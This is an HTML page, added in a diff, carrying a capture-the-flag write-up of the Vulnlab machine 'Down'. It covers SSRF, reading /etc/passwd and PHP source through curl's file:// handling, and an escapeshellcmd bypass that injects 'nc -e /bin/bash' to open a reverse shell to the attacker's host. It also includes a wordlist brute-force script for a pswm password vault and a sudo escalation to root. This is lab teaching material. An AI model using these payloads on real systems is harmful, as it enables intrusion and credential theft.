@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Write-Ups</title>
+    <link rel="stylesheet" href="style.css">
+    <script defer src="script.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="navbar">
+            <ul class="nav-links">
+                <li><a href="index.html"><i class="fas fa-home"></i> Home</a></li>
+                <li><a href="Write-up.html"><i class="fas fa-file-alt"></i> Write-Ups</a></li>
+                <li><a href="#redteam"><i class="fas fa-user-secret"></i> Red Team</a></li>
+            </ul>
+        </div>
+        <div class="contents">
+            <h1>Down Write-up</h1>
+            <div class="big-to-normal-image">
+                <img src="images/Down.png" alt="Down Write-up">
+            </div>
+            <p>This box from Vulnlab begins with leveraging a command injection vulnerability in the website, specifically through the misuse of the <code>curl</code> command. By abusing this, we gain access to the PHP source code of the application. Analyzing the code, we discover that it uses the <code>escapeshellcmd</code> function to execute the <code>nc</code> (netcat) command, which we exploit to gain a reverse shell on the target.</p>
+            <p>Once inside, we enumerate the user's home directory and discover hidden files and directories. Among these, one file stands out, revealing an encrypted key for a password manager. After decrypting the key, we recover the user's credentials, allowing us to SSH into the target as that user.</p>
+            <p>Upon gaining access as the user, we find that they have <code>sudo</code> privileges to execute all commands, which we abuse to escalate privileges to root. With this, we successfully compromise the machine and retrieve the root flag.</p>
+            <h2>Enumeration</h2>
+            <h3>Nmap Scan</h3>
+            <div class="snippet">
+                <pre class="code-block">
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 19:47 PST
+Stats: 0:04:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 19:51 (0:00:06 remaining)
+Stats: 0:04:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 100.00% done; ETC: 19:51 (0:00:00 remaining)
+Nmap scan report for 10.10.100.238
+Host is up (0.22s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
+|_  256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Is it down or just me?
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 291.81 seconds
+                </pre>
+            </div>
+            <p>Only two ports are shown which are port 22 (ssh) and port 80 (http). Looking into port 80 the website shows us to see if the website we specify is down or up</p>
+            <img src="images/Down-website.png" alt="Down website">
+            <p>Lets input a url and see if it can return itself as down or up</p>
+            <div class="snippet">
+                <pre class="code-block">
+http://127.0.0.1
+                </pre>
+            </div>
+            <img src="images/Down-Url-check.png" alt="Down URL Check">
+            <p>The output of the HTML reveals the website’s own content, which provides an opportunity to test for vulnerabilities like SSRF (Server-Side Request Forgery) and Command Injection. In this case, I will demonstrate both, starting with SSRF.</p>
+            <h2>SSRF Overview</h2>
+            <p>SSRF allows an attacker to access restricted content or services that are not directly accessible to them. It is also commonly used to enumerate ports and services hosted internally on the target's network. To check if the application is vulnerable to SSRF, we can test if the server makes a callback request to our machine.</p>
+            <h3>Testing for SSRF</h3>
+            <p>To verify the SSRF vulnerability, we can set up a listener using <code>netcat</code> to capture any outgoing requests from the server. If the server connects to our listener, it confirms the vulnerability. Let's proceed to test for this behavior.</p>
+            <img src="images/Down-SSRF-nc.png" alt="Down SSRF">
+            <img src="images/Down-SSRF-request.png" alt="Down SSRF">
+            <img src="images/Down-SSRF-Confirmed.png" alt="Down SSRF Confirmed">
+            <p>After sending the request, we receive a callback to our listener, confirming two key points:</p>
+            <ul>
+                <li>The application is vulnerable to SSRF.</li>
+                <li>The <code>User-Agent</code> reveals that <code>curl</code> is being used to process the request, suggesting the server relies on a <code>curl</code> command to handle the provided URL input.</li>
+            </ul>
+            <p>Based on this observation, my assumption is that the URL input is processed with a command similar to:</p>
+            <div class="snippet">
+                <pre class="code-block">
+curl $URL
+                </pre>
+            </div>
+            <p>This indicates the potential for command injection. To verify, I tested various inputs to check if additional commands could be executed. By appending <code>-i</code> or <code>--help</code> to the input, I observed different outputs, which confirmed that command injection is possible but restricted to options or arguments recognized by <code>curl</code>.</p>
+            <img src="images/Down-Command-Injuction.png" alt="Down Command Injection Confirmed">
+            <p>After spending considerable time testing various approaches, it became evident that standard command injection methods were leading to dead ends. However, I discovered an alternative approach leveraging curl's ability to handle multiple protocols. One powerful feature of <code>curl</code> is its ability to interact with different protocols beyond HTTP, such as <code>file://</code>, which can access the local filesystem.</p>
+            By using the <code>file://</code> protocol combined with the ability to curl <code>localhost</code>, we can exploit this feature to read sensitive files from the server. For instance, the <code>/etc/passwd</code> file can be accessed directly by crafting a URL as follows:
+            <div class="snippet">
+                <pre class="code-block">
+http://127.0.0.1+file:///etc/passwd
+                </pre>
+            </div>
+            <img src="images/Down-LFI.png" alt="Down LFI">
+            <p>This approach works because the application is blindly passing user input to <code>curl</code> without sanitization, effectively allowing us to exploit a Local File Inclusion (LFI) vulnerability using the <code>file://</code> protocol.</p>
+            <p>As demonstrated, we can use the <code>curl</code> command to access files on the local filesystem. By inspecting <code>/etc/passwd</code>, we identify a user named <code>aleks</code>, which is a useful detail to note. However, attempts to retrieve Aleks's SSH keys were unsuccessful.</p>
+            <p>At this point, it’s worth highlighting an observation: the website uses an <code>index.php</code> file instead of an <code>index.php</code>. Why is this significant? PHP files contain backend code, which is not visible to public users inspecting the webpage via browser tools like "Inspect Element." Unlike HTML files, PHP files execute server-side and may contain sensitive logic, such as database connections or authentication mechanisms, that are hidden from the frontend.</p>
+            <p>Knowing this, we can hypothesize that accessing the source code of <code>index.php</code> could reveal critical backend details. Typically, websites are hosted in the <code>/var/www/html</code> directory, so let’s attempt to read the contents of the <code>index.php</code> file:</p>
+            <div class="snippet">
+                <pre class="code-block">
+http://127.0.0.1+file:///var/www/html/index.php
+                </pre>
+            </div>
+            <img src="images/Down-PHP-Content.png" alt="Down PHP Content">
+            <p>Upon reviewing the <code>index.php</code> file, we find PHP code that stands out. This specific snippet caught my attention:</p>
+            <div class="snippet">
+                <pre class="code-block">
+if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' && isset($_POST['ip']) && isset($_POST['port']) ) {
+    $ip = trim($_POST['ip']);
+    $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);
+    $port = trim($_POST['port']);
+    $port_int = intval($port);
+    $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
+    if ( $valid_ip && $valid_port ) {
+        $rc = 255; $output = '';
+        $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
+        exec($ec . " 2>&1", $output, $rc);
+                </pre>
+            </div>
+            <h3>Breaking It Down</h3>
+            <ol>
+                <li>Request Parameter: The script checks if the GET parameter <code>expertmode</code> is set to <code>tcp</code> (<code>index.php?expertmode=tcp</code>).</li>
+                <li>IP Address Validation:</li>
+                <ul>
+                    <li><code>$ip</code>: The provided IP address is fetched from the POST parameter <code>ip</code>.</li>
+                    <li><code>$valid_ip</code>: The IP address is validated using <code>FILTER_VALIDATE_IP</code>.</li>
+                </ul>
+                <li>Port Validation:</li>
+                <ul>
+                    <li><code>$port</code>: The provided port is fetched from the POST parameter <code>port</code>.</li>
+                    <li><code>$port_int</code>: The port value is converted into an integer.</li>
+                    <li><code>$valid_port</code>: The port is validated using <code>FILTER_VALIDATE_INT</code>.</li>
+                </ul>
+                <li>Command Execution:</li>
+                <ul>
+                    <li><code>$ec</code>: The <code>escapeshellcmd</code> function is used to sanitize and prepare the <code>nc</code> command (<code>/usr/bin/nc -vz $ip $port</code>).</li>
+                    <li><code>exec()</code>: Executes the <code>nc</code> command, captures the output and return code (<code>$rc</code>).</li>
+                </ul>
+            </ol>
+            <h3>Key Observation</h3>
+            <p>While the <code>escapeshellcmd</code> function is designed to escape special characters and mitigate command injection vulnerabilities, it is not foolproof. According to the <a href="https://www.php.net/manual/en/function.escapeshellcmd.php">PHP documentation</a>, attackers can still inject malicious input depending on the command being executed. This is particularly true if the command (<code>nc</code> in this case) accepts additional flags or arguments that can be abused.</p>
+            <p>This discovery hints at a potential attack vector. Next, we will investigate how to manipulate the command execution while bypassing the <code>escapeshellcmd</code> sanitization.</p>
+            <p>Given the context, we know that the application executes the <code>nc</code> (Netcat) command on the server-side. Netcat provides a flag, <code>-e</code>, that allows the execution of a program upon connection. This can be abused to spawn a shell by executing <code>/bin/bash</code> or <code>/bin/sh</code>.</p>
+            <h2>FootHold</h2>
+            <p>Navigate to the vulnerable webpage and append the following parameters to the URL:</p>
+            <div class="snippet">
+                <pre class="code-block">
+http://10.10.103.199/index.php?expertmode=tcp
+                </pre>
+            </div>
+            <img src="images/Down-expertmode.png" alt="Down Expertmode">
+            <p>Now we can apply our logic. set up necat and lets catch this shell.</p>
+            <div class="snippet">
+                <pre class="code-block">
+ip=10.8.5.55&port=4444+-e+/bin/bash
+                </pre>
+            </div>
+            <img src="images/Down-Parameters.png" alt="Down parameters">
+            <img src="images/Down-shell.png" alt="Down WWW-Data User">
+            <p>Lets get a stable shell.</p>
+            <div class="snippet">
+                <pre class="code-block">
+python3 -c 'import pty; pty.spawn("/bin/bash
+
+export TERM=xterm-256color
+                </pre>
+            </div>
+            <p>Checking the <code>/home/aleks</code> shows us nothing however if we run <code>ls -al</code> we can see we are able to view and access one directory in particular which is interesting.</p>
+            <div class="snippet">
+                <pre class="code-block">
+drwxr-xr-x 5 aleks aleks 4096 Sep 15 09:15 .
+drwxr-xr-x 3 root  root  4096 Sep 13 14:43 ..
+lrwxrwxrwx 1 aleks aleks    9 Sep  6 14:43 .bash_history -> /dev/null
+-rw-r--r-- 1 aleks aleks  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 aleks aleks 3771 Jan  6  2022 .bashrc
+drwx------ 2 aleks aleks 4096 Sep  6 15:03 .cache
+drwxrwxr-x 3 aleks aleks 4096 Sep  6 14:45 .local
+-rw-r--r-- 1 aleks aleks  807 Jan  6  2022 .profile
+drwx------ 2 aleks aleks 4096 Sep  6 14:42 .ssh
+-rw-r--r-- 1 aleks aleks    0 Sep 15 09:15 .sudo_as_admin_successful
+                </pre>
+            </div>
+            <p>The <code>.local</code> directory is interesting so checking the directories we manage to find a file called <code>pswm</code>.</p>
+            <div class="snippet">
+                <pre class="code-block">
+www-data@down:/home/aleks/.local/share/pswm$ ls -al
+ls -al
+total 12
+drwxrwxr-x 2 aleks aleks 4096 Sep 13 15:36 .
+drwxrwxr-x 3 aleks aleks 4096 Sep 13 15:36 ..
+-rw-rw-r-- 1 aleks aleks  151 Sep 13 15:36 pswm
+                </pre>
+            </div>
+            <h2>User as Aleks</h2>
+            <p>We are able to view the file lets see what it contains.</p>
+            <div class="snippet">
+                <pre class="code-block">
+e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
+                </pre>
+            </div>
+            <p>Upon examining the encrypted file, it appears to be Base64-encoded. However, decoding it with Base64 returned gibberish. After further research, I discovered that the file is associated with pswm, a password manager tool. Reviewing the tool's source code on GitHub reveals that it uses the <code>cryptocode</code> library for encryption, which leverages AES encryption.</p>
+            <p>We have two main options to decrypt the file:</p>
+            <ol>
+                <li>Use an Existing Decoder: A GitHub repository, <a href="https://github.com/repo4Chu/pswm-decoder">pswm-decoder</a> is specifically designed to decrypt pswm-encrypted files. This is the quickest and easiest method if you prefer to use a pre-made tool.</li>
+                <li>Create Your Own Script: Writing a custom script to decrypt the file is also a viable option and an excellent learning opportunity. The primary steps involve:</li>
+                <ul>
+                    <li>Brute-forcing the master password using a wordlist (e.g., <code>rockyou.txt</code>).</li>
+                    <li>Using the <code>cryptocode.decrypt()</code> function to attempt decryption for each password.</li>
+                </ul>
+            </ol>
+            <p>For this write-up, I’ll create my own script to demonstrate how it works. However, feel free to use the <a href="https://github.com/repo4Chu/pswm-decoder">pswm-decorder</a> if you prefer a ready-to-use solution.</p>
+            <div class="snippet">
+                <pre class="code-block">
+#!/usr/bin/python3
+
+import cryptocode
+
+# File paths
+wordlist = "/home/pixelrazer/SecLists/Passwords/Leaked-Databases/rockyou.txt"
+encrypted_key = "/home/pixelrazer/vulnhub/ecnrypted.txt"
+
+# Decrypt function
+def decrypt(wordlists):
+    with open(encrypted_key, 'r') as file:
+        encrypted_text = file.read()  # Read the encrypted content
+
+    with open(wordlists, 'r', encoding="latin1") as word:
+        for line in word:
+            password = line.strip()  # Clean password from newline/whitespace
+            try:
+                decrypted_text = cryptocode.decrypt(encrypted_text, password)
+                if decrypted_text:  # Check if decryption was successful
+                    print(f"Decrypted text: {decrypted_text}")
+                    print(f"Password found: {password}")
+                    return  # Stop searching once the password is found
+            except Exception as e:
+                print(f"Error with password {password}: {e}")
+
+# Run the decrypt function
+decrypt(wordlist)
+                </pre>
+            </div>
+            <p>This is the script I made very similar to the one from github. Copy the file of pswm onto your machine and paste into a file. Run the script of either mine or the github which will decrypt the password from the rockyou.txt wordlist. We got aleks password which we can use to ssh.</p>
+            <img src="images/Down-Aleks.png" alt="Down Aleks SSH">
+            <h2>Privilege Escalation</h2>
+            <p>The privilege escalation process is straightforward, as the user has unrestricted sudo access, allowing them to execute any command with elevated privileges.</p>
+            <img src="images/Down-Sudo-Priv.png" alt="Down Sudo Priv">
+            <p>When we get that we can sudo into root user.</p>
+            <div class="snippet">
+                <pre class="code-block">
+sudo su
+                </pre>
+            </div>
+            <img src="images/Down-Root.png" alt="Down Root pwn">
+            <h2>Conclusion</h2>
+            <p>This box highlights the importance of secure coding practices, such as avoiding unsafe command execution functions, validating inputs rigorously, and restricting unnecessary privileges. It demonstrates real-world vulnerabilities that attackers exploit and reinforces the critical need for regular security audits to identify and mitigate these issues. Overall, this challenge served as a great exercise in enumeration, exploitation, and privilege escalation, reinforcing foundational pentesting skills while emphasizing the importance of attention to detail and creative thinking.</p>
+        </div>
+    </div>
+</body>
